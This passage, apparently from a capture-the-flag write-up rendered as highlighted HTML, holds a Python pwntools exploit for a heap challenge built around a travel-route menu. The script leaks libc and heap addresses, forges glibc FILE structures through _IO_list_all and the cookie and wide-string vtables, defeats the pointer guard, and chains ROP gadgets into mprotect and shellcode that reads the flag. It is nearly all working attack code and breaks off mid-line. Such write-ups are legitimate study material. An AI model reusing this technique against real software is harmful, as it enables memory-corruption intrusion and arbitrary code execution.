data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>tp<span class=\"token punctuation\">,</span>fw<span class=\"token punctuation\">,</span>tw<span class=\"token punctuation\">,</span>jl<span class=\"token punctuation\">,</span>note<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'car/train/plane?\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>tp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>fw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>tw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'How far?\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>jl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">'Note:\\n'</span><span class=\"token punctuation\">,</span>note<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>fw<span class=\"token punctuation\">,</span>tw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>fw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>tw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>fw<span class=\"token punctuation\">,</span>tw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>fw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>tw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>fw<span class=\"token punctuation\">,</span>tw<span class=\"token punctuation\">,</span>cg<span class=\"token punctuation\">,</span>jl<span class=\"token punctuation\">,</span>note<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>fw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>tw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'Which one do you want to change?\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>cg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'How far?\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>jl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">'Note:\\n'</span><span class=\"token punctuation\">,</span>note<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Dijkstra</span><span class=\"token punctuation\">(</span>city<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\tmenu<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">'input the city name\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>city<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\t\tr <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\t\tDijkstra<span class=\"token punctuation\">(</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'train'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'e'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanchang'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1234'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'N'</span><span class=\"token operator\">*</span><span class=\"token number\">0x4ef</span><span class=\"token operator\">+</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\t\t\tshow<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>\t\t\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\t\t\tlibcbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x21b110</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'N'</span><span class=\"token operator\">*</span><span class=\"token number\">0x4f7</span><span class=\"token operator\">+</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>\t\t\tsleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t\t\tshow<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\t\t\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'^'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>\t\t\theapbase <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x001470</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>\t\t\tlg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\t\t\tlg<span class=\"token punctuation\">(</span><span class=\"token string\">'heapbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>\t\t\tdele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>\t\t\t<span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\t\t\t\ttarget<span class=\"token operator\">=</span>libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_list_all'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>\t\t\t\tfake_io_1_addr<span class=\"token operator\">=</span>heapbase<span class=\"token operator\">+</span><span class=\"token number\">0x1470</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\t\t\t\tfake_io_2_addr<span class=\"token operator\">=</span>fake_io_1_addr<span class=\"token operator\">+</span><span class=\"token number\">0x100</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>\t\t\t\toffset <span class=\"token operator\">=</span> <span class=\"token number\">0x3</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">20</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>\t\t\t\toffset <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>\t\t\t\toffset <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\t\t\t\t_IO_wstrn_jumps <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x216dc0</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\t\t\t\t_IO_cookie_jumps <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x216b80</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>\t\t\t\t_lock <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span>  <span class=\"token number\">0x21ca60</span><span class=\"token comment\">#libc.sym._IO_stdfile_2_lock</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>\t\t\t\tpoint_guard_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> offset <span class=\"token operator\">+</span> <span class=\"token number\">0x770</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>\t\t\t\tlog<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string\">\"point_guard_addr:\\t\"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>point_guard_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>\t\t\t\texpected <span class=\"token operator\">=</span> fake_io_2_addr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\t\t\t\tmagic_gadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000167420</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>\t\t\t\tmov_rsp_rdx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x5a120</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>\t\t\t\tadd_rsp_0x20_pop_rbx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xd2ba5</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>\t\t\t\tpop_rdi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x2a3e5</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>\t\t\t\tpop_rsi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x2be51</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>\t\t\t\tpop_rdx_rbx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x904a9</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>\t\t\t\tfake_io_1 <span class=\"token operator\">=</span> IO_FILE_plus_struct<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>\t\t\t\tfake_io_1<span class=\"token punctuation\">.</span>chain <span class=\"token operator\">=</span> fake_io_2_addr</pre></td></tr><tr><td data-num=\"149\"></td><td><pre>\t\t\t\tfake_io_1<span class=\"token punctuation\">.</span>_flags2 <span class=\"token operator\">=</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>\t\t\t\tfake_io_1<span class=\"token punctuation\">.</span>_mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>\t\t\t\tfake_io_1<span class=\"token punctuation\">.</span>_lock <span class=\"token operator\">=</span> _lock</pre></td></tr><tr><td data-num=\"152\"></td><td><pre>\t\t\t\tfake_io_1<span class=\"token punctuation\">.</span>_wide_data <span class=\"token operator\">=</span> point_guard_addr</pre></td></tr><tr><td data-num=\"153\"></td><td><pre>\t\t\t\tfake_io_1<span class=\"token punctuation\">.</span>vtable <span class=\"token operator\">=</span> _IO_wstrn_jumps</pre></td></tr><tr><td data-num=\"154\"></td><td><pre>\t\t\t\t\t\t </pre></td></tr><tr><td data-num=\"155\"></td><td><pre>\t\t\t\tfake_io_2 <span class=\"token operator\">=</span> IO_FILE_plus_struct<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>\t\t\t\tfake_io_2<span class=\"token punctuation\">.</span>_IO_write_base <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>\t\t\t\tfake_io_2<span class=\"token punctuation\">.</span>_IO_write_ptr <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>\t\t\t\tfake_io_2<span class=\"token punctuation\">.</span>_lock <span class=\"token operator\">=</span> _lock</pre></td></tr><tr><td data-num=\"159\"></td><td><pre>\t\t\t\tfake_io_2<span class=\"token punctuation\">.</span>_mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>\t\t\t\tfake_io_2<span class=\"token punctuation\">.</span>_flags2 <span class=\"token operator\">=</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>\t\t\t\tfake_io_2<span class=\"token punctuation\">.</span>vtable <span class=\"token operator\">=</span> _IO_cookie_jumps <span class=\"token operator\">+</span> <span class=\"token number\">0x58</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>\t\t\t\t\t </pre></td></tr><tr><td data-num=\"163\"></td><td><pre>\t\t\t\t\t </pre></td></tr><tr><td data-num=\"164\"></td><td><pre>\t\t\t\tdata <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>\t\t\t\t    <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>fake_io_1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>\t\t\t\t    <span class=\"token number\">0xe0</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>\t\t\t\t        <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>fake_io_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>\t\t\t\t        <span class=\"token number\">0xe0</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>fake_io_2_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span> rol<span class=\"token punctuation\">(</span>magic_gadget <span class=\"token operator\">^</span> expected<span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>\t\t\t\t        <span class=\"token number\">0x100</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>\t\t\t\t            add_rsp_0x20_pop_rbx_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>\t\t\t\t            fake_io_2_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>\t\t\t\t            <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>\t\t\t\t            <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>\t\t\t\t            mov_rsp_rdx_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>\t\t\t\t            <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>\t\t\t\t            pop_rdi_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>\t\t\t\t            fake_io_2_addr <span class=\"token operator\">&amp;</span> <span class=\"token operator\">~</span><span class=\"token number\">0xfff</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>\t\t\t\t            pop_rsi_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>\t\t\t\t            <span class=\"token number\">0x4000</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>\t\t\t\t            pop_rdx_rbx_ret<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>\t\t\t\t            <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>\t\t\t\t            libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'mprotect'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>\t\t\t\t            fake_io_2_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x200</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>\t\t\t\t        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>\t\t\t\t        <span class=\"token number\">0x200</span><span class=\"token punctuation\">:</span> ShellcodeMall<span class=\"token punctuation\">.</span>amd64<span class=\"token punctuation\">.</span>cat_flag</pre></td></tr><tr><td data-num=\"186\"></td><td><pre>\t\t\t\t    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>\t\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>\t\t\t\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'car'</span><span class=\"token 